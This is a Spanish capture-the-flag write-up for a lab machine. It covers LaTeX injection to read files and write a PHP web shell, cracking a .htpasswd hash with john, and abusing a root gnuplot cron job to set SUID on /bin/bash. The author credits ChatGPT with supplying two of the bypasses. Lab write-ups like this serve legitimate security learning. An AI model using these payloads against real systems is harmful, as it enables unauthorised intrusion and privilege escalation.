------------
- Tags: #latex-injection #web-shell #latex-bypass #password-crack #gnuplot-abuse #cron-job 
-----------
## Tecnicas utilizadas
- Latex injection ByPass Ilegal Command
- Crack Password [.htpasswd]
- Abuse cron job (GNUPLOT execute)
## Procedimiento
![[Pasted image 20230610115556.png]]


Con el escaneo en nmap. encontramos que tiene abierto el puerto **22** y el puerto *80*:

![[Pasted image 20230610120856.png]]

Haciendo un **whatweb** a la pagina principal, nos muestra las siguientes tecnologias:

![[Pasted image 20230610121017.png]]

--------------------

#### Latex injection ByPass Ilegal Command

En la pagina principal de la web, nos muestran ciertas herramientas desarolladas por el departamento estudiantil, entre ellas vemos una que nos redirige a un subdominio que no tenemos contemplado en el */etc/hosts*. Lo agregamos y al visitar el subdominio nos damos cuenta que es una pagina que genera documentos en **Latex**.

Al colocar una injecion comun de latex nos aparece un error:

![[Pasted image 20230610121943.png]]

Pero si intentamos leer un archivo con las siguientes lineas:

```latex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file```

Si se nos permite, solo que solo podemos leer la primera linea. Y si intetamos usar el comando *Loop* no se nos deja.
Estando buen rato intentado leer comandos, no pude mas que solo leer algunas lineas de los archivos, asi que intente escribir archivos. *\input* y *\write18* son comandos no validos, asi que preguntandole a **ChatGPT** si habia una alternativa a *\write18* me dio el siguiente resultado:

```latex
\begin{filecontents*}{shell.php} 
<?php system($_GET['cmd']);?> 
\end{filecontents*}
```

------------------------

#### Crack Password

Escribimos una web shell y nos entablamos una reverse shell. Podemos ver una lista de las palabras bloqueadas en el script de la pagina de Latex:

![[Pasted image 20230610160808.png]]

Una vez dentro, podemos encontrar un .htpasswd el cual tiene la contraseña del usuario vdaisley encriptada, usando john podemos romper el hash.

----------------------

#### Abuse cron job (GNUPLOT execute)

Una vez pivitiamos al usuario *vdaisley* subimos el binario *pspy* para ver los procesos que se ejecutan en en intervalos regulares de tiempo. Podemos observar que hay un proceso que ejecuta root que es el siguiente:

![[Pasted image 20230610172000.png]]

Preguntandole a **ChatGPT** si es posible ejecutar comando con archivos de **gnuplot**  con extension **.plt** nos da la siguente respuesta:

```gnuplot
!chmod +x script.sh !./script.sh
```

Asi que aprovechamos y le damos privilegios SUID a la bash de la siguiente forma

```
!chmod u+s /bin/bash
```

Y pwneamos la maquina.